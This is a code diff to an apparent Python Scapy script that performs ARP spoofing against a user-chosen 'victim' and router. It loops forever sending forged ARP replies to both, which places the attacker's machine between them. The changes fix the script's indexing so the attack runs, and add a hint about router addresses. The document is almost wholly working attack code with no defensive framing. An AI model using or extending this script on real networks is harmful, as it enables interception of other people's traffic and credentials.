@@ -25,13 +25,13 @@ print("macs in the network", mac)
 
 print("Enter victim ip (1, 2, 3,...)")
 victim = input()
-print("Enter router ip (1, 2, 3, ...")
+print("Enter router ip (1, 2, 3, ...) Usually ends by .254")
 router = input()
 
 while True:
-    arp_response = ARP(pdst=ip[victim-1], hwdst=mac[ip.index(victim)], psrc=ip[router-1])
+    arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=ip[int(router)-1])
     scap.send(arp_response, count = 1)
-    arp_response = ARP(pdst=ip[router-1], hwdst=mac[ip.index(router)], psrc=ip[victim-1])
+    arp_response = ARP(pdst=ip[int(router)-1], hwdst=mac[int(router)-1], psrc=ip[int(victim)-1])
     scap.send(arp_response, count = 1)
     time.sleep(1)
 
